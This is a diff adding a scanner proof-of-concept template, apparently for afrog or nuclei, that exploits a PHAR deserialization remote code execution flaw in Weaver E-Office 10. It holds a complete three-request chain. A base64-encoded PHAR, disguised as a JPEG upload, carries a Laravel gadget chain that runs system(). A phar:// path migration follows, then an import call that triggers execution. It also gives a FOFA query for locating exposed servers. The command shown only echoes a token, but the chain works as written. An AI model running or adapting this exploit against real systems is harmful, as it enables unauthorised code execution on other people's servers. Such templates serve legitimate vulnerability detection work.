@@ -1,0 +1,60 @@
+id: e-office10-atuh-file-phar-deserialization-rce
+
+info:
+  name: 泛微 E-Office 10 atuh-file PHAR 反序列化远程代码执行
+  author: zan8in
+  severity: critical
+  description: |
+    泛微 E-Office 10 /eoffice10/server/public/api/attachment/atuh-file 处理 PHAR 时触发反序列化，配合 path/migrate 与 empower/import 可在本地回显验证命令执行。
+  reference:
+    - https://github.com/zan8in/afrog-pocs
+  metadata:
+    verified: true
+    max-request: 3
+    fofa-query: app="泛微-EOffice" && body="eoffice_loading_tip" && body="eoffice10"
+  tags: weaver,e-office,phar,rce,deserialization
+
+variables:
+  boundary: "{{rand_base(8)}}"
+
+http:
+  - raw:
+      - |
+        POST /eoffice10/server/public/api/attachment/atuh-file HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary={{boundary}}
+
+        --{{boundary}}
+        Content-Disposition: form-data; name="Filedata"; filename="register.inc"
+        Content-Type: image/jpeg
+
+        {{base64_decode("R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQpEAQAAAQAAABEAAAABAAAAAAAOAQAATzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO3M6Njoic3lzdGVtIjt9czo4OiIAKgBldmVudCI7TzozODoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcQnJvYWRjYXN0RXZlbnQiOjE6e3M6MTA6ImNvbm5lY3Rpb24iO3M6Mzc6ImVjaG8gOXlNODZFU3lGQlhORHdDaDZOYnN4eTl3cmNRclAyNVAiO319CAAAAHRlc3QudHh0BAAAAEvbA2YEAAAADH5/2KQBAAAAAAAAdGVzdIEpwGmDhmYzxumoAjJwcaz4EdU+AgAAAEdCTUI=")}}
+        --{{boundary}}--
+      - |
+        POST /eoffice10/server/public/api/attachment/path/migrate HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        source_path=&desc_path=phar%3A%2F%2F..%2F..%2F..%2F..%2Fattachment%2F
+      - |
+        POST /eoffice10/server/public/api/empower/import HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        type=tttt&file={{attachment_id}}
+
+    extractors:
+      - type: regex
+        name: attachment_id
+        internal: true
+        group: 1
+        regex:
+          - '"attachment_id":"([^"]+)"'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200 && contains(body_1, "\"attachment_id\":")'
+          - 'status_code_2 == 200 && contains(body_2, "\"status\":1")'
+          - 'status_code_3 == 200 && contains(body_3, "9yM86ESyFBXNDwCh6Nbsxy9wrcQrP25P") && contains(body_3, "\"code\":\"no_file\"")'
+        condition: and
